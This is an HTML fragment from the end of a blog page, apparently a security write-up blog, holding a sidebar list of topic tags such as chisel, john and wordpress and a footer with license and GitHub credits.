            <li class="tag tag-3">
              <a href="../../tag/openadmin.html">openAdmin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/jackson.html">jackson</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chisel.html">chisel</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vb.html">VB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/zip.html">zip</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/wordpress.html">wordpress</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adb.html">adb</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/yaml.html">YAML</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/rsa.html">RSA</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/enumeration.html">enumeration</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/upload.html">Upload</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/john.html">john</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phs.html">PHS</a>
            </li>
    </ul>
</section>

            </div>
        </aside>
    </div>

    <section class="pure-g-r footer">
<div class="pure-u-2-3 copyright">
    <p class="l-box">
        The content of this blog in under
        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.

        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
    </p>
</div>

<div class="pure-u-1-3 credits">
    <p class="l-box">
        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
    </p>
</div>    </section>


</div>
</body>
</html>